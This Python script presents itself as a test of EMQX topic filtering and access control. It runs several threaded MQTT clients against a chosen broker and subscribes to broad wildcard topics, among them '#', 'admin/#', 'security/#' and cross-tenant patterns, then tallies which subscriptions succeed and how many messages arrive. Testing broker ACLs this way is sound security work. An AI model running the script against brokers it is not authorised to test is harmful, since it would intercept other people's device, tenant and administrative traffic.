#!/usr/bin/env python3
"""
MQTT Wildcard Abuse Attack Script (Windows Compatible)
======================================================
Simulates wildcard subscription abuse to test EMQX topic filtering and ACL.
"""

import paho.mqtt.client as mqtt
import json
import time
import threading
import random
import argparse
import sys
import os
from datetime import datetime, timezone

class WildcardAbuseAttack:
    def __init__(self, broker_host="localhost", broker_port=1883, 
                 username=None, password=None, use_tls=False):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.username = username
        self.password = password
        self.use_tls = use_tls
        self.clients = []
        self.attack_stats = {
            "subscriptions_attempted": 0,
            "subscriptions_successful": 0,
            "subscriptions_failed": 0,
            "messages_received": 0,
            "connections_failed": 0,
            "start_time": None,
            "end_time": None
        }
        
    def create_client(self, client_id):
        """Create MQTT client with security settings"""
        try:
            client = mqtt.Client(client_id=client_id, callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
            
            if self.username and self.password:
                client.username_pw_set(self.username, self.password)
            
            if self.use_tls:
                client.tls_set()
            
            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None
    
    def wildcard_worker(self, worker_id, wildcard_topics, duration_seconds=60):
        """Worker thread for wildcard abuse attack"""
        client_id = f"wildcard_abuser_{worker_id}"
        client = self.create_client(client_id)
        
        if not client:
            self.attack_stats["connections_failed"] += 1
            return
        
        def on_connect(client, userdata, flags, rc, properties):
            if rc == 0:
                print(f" Worker {worker_id}: Connected, starting wildcard abuse...")
                
                # Subscribe to wildcard topics
                for topic in wildcard_topics:
                    try:
                        result = client.subscribe(topic, qos=1)
                        self.attack_stats["subscriptions_attempted"] += 1
                        
                        if result[0] == 0:
                            self.attack_stats["subscriptions_successful"] += 1
                            print(f" Worker {worker_id}: Subscribed to {topic}")
                        else:
                            self.attack_stats["subscriptions_failed"] += 1
                            print(f" Worker {worker_id}: Failed to subscribe to {topic}")
                    except Exception as e:
                        self.attack_stats["subscriptions_failed"] += 1
                        print(f" Worker {worker_id}: Error subscribing to {topic}: {e}")
            else:
                print(f" Worker {worker_id}: Connection failed: {rc}")
                self.attack_stats["connections_failed"] += 1
        
        def on_message(client, userdata, msg, properties=None):
            self.attack_stats["messages_received"] += 1
            if self.attack_stats["messages_received"] % 10 == 0:  # Don't spam
                print(f" Worker {worker_id}: Received message on {msg.topic}")
        
        def on_subscribe(client, userdata, mid, granted_qos, properties):
            print(f" Worker {worker_id}: Subscription granted with QoS {granted_qos}")
        
        try:
            client.on_connect = on_connect
            client.on_message = on_message
            client.on_subscribe = on_subscribe
            
            # Connect to broker
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()
            
            # Run for specified duration
            time.sleep(duration_seconds)
            
            print(f" Worker {worker_id}: Completed wildcard abuse attack")
            
        except Exception as e:
            print(f" Worker {worker_id}: Error: {e}")
            self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass
    
    def launch_attack(self, num_workers=3, duration_seconds=60, wildcard_topics=None):
        """Launch wildcard abuse attack"""
        if wildcard_topics is None:
            wildcard_topics = [
                "#",  # Subscribe to everything
                "+/+/+",  # Three-level wildcard
                "factory/#",  # Factory wildcard
                "factory/+/+/telemetry",  # Telemetry wildcard
                "system/#",  # System wildcard
                "admin/#",  # Admin wildcard (should be blocked)
                "security/#",  # Security wildcard (should be blocked)
                "+/+/+/+",  # Four-level wildcard
                "factory/+/+/+/+",  # Deep factory wildcard
                "+/tenantA/+/telemetry",  # Tenant wildcard
                "factory/+/+/command",  # Command wildcard
                "+/+/+/status",  # Status wildcard
                "test/#",  # Test wildcard
                "debug/#",  # Debug wildcard
                "monitor/#",  # Monitor wildcard
            ]
        
        print(f" Starting Wildcard Abuse Attack")
        print(f"   Workers: {num_workers}")
        print(f"   Duration: {duration_seconds} seconds")
        print(f"   Wildcard topics: {len(wildcard_topics)}")
        print("=" * 60)
        
        self.attack_stats["start_time"] = time.time()
        
        # Create worker threads
        threads = []
        for i in range(num_workers):
            thread = threading.Thread(
                target=self.wildcard_worker,
                args=(i, wildcard_topics, duration_seconds)
            )
            threads.append(thread)
        
        # Start all workers
        for thread in threads:
            thread.start()
        
        # Monitor attack
        try:
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print("\n  Attack stopped by user")
        
        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()
    
    def print_attack_stats(self):
        """Print attack statistics"""
        duration = self.attack_stats["end_time"] - self.attack_stats["start_time"]
        
        print("\n Attack Statistics:")
        print("=" * 40)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Subscriptions attempted: {self.attack_stats['subscriptions_attempted']}")
        print(f"Subscriptions successful: {self.attack_stats['subscriptions_successful']}")
        print(f"Subscriptions failed: {self.attack_stats['subscriptions_failed']}")
        print(f"Messages received: {self.attack_stats['messages_received']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")
        
        if self.attack_stats['subscriptions_attempted'] > 0:
            success_rate = (self.attack_stats['subscriptions_successful'] / 
                           self.attack_stats['subscriptions_attempted'] * 100)
            print(f"Subscription success rate: {success_rate:.1f}%")
        
        if duration > 0:
            print(f"Messages per second: {self.attack_stats['messages_received']/duration:.1f}")

def main():
    parser = argparse.ArgumentParser(description="MQTT Wildcard Abuse Attack")
    parser.add_argument("--broker", default="localhost", help="MQTT broker host")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--username", help="MQTT username")
    parser.add_argument("--password", help="MQTT password")
    parser.add_argument("--tls", action="store_true", help="Use TLS connection")
    parser.add_argument("--workers", type=int, default=3, help="Number of worker threads")
    parser.add_argument("--duration", type=int, default=60, help="Attack duration in seconds")
    parser.add_argument("--topics", nargs="+", help="Custom wildcard topics")
    
    args = parser.parse_args()
    
    # Create attack instance
    attack = WildcardAbuseAttack(
        broker_host=args.broker,
        broker_port=args.port,
        username=args.username,
        password=args.password,
        use_tls=args.tls
    )
    
    # Launch attack
    attack.launch_attack(
        num_workers=args.workers,
        duration_seconds=args.duration,
        wildcard_topics=args.topics
    )

if __name__ == "__main__":
    main()
